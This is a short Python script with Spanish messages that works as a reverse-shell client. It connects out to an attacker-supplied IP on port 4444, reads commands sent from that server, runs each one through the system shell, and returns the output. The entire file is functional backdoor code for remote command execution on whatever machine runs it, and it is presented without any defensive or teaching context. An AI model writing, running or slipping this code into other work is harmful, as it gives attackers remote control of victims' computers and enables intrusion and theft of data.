import sys
import socket
import subprocess
import threading

SERVER_IP = "your ip"
PORT = 4444

def handle_commands(sock):
    while True:
        try:
            cmd = sock.recv(1024).decode()
            print(f'[+] Recibiendo comando: {cmd}')
            if cmd.lower() in ['q']:
                break
            try:
                result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
            except subprocess.CalledProcessError as e:
                result = e.output
            except Exception as e:
                result = str(e).encode()
            
            if not result:
                result = print(f'[+] Ejecución exitosa')
            
            sock.send(result)
        except Exception as e:
            print(f'[!] Error manejando el comando: {e}')
            break

    sock.close()

def main():
    s = socket.socket()
    s.connect((SERVER_IP, PORT))
    msg = s.recv(1024).decode()
    print('[+] Conectado al servidor:', msg)

    command_thread = threading.Thread(target=handle_commands, args=(s,))
    command_thread.daemon = True
    command_thread.start()

    # Mantén el cliente en ejecución
    while True:
        try:
            # Aquí puedes agregar más lógica si es necesario
            command_thread.join(1)
            if not command_thread.is_alive():
                break
        except KeyboardInterrupt:
            print('[+] Cliente detenido por el usuario.')
            break

    s.close()

if __name__ == "__main__":
    main()
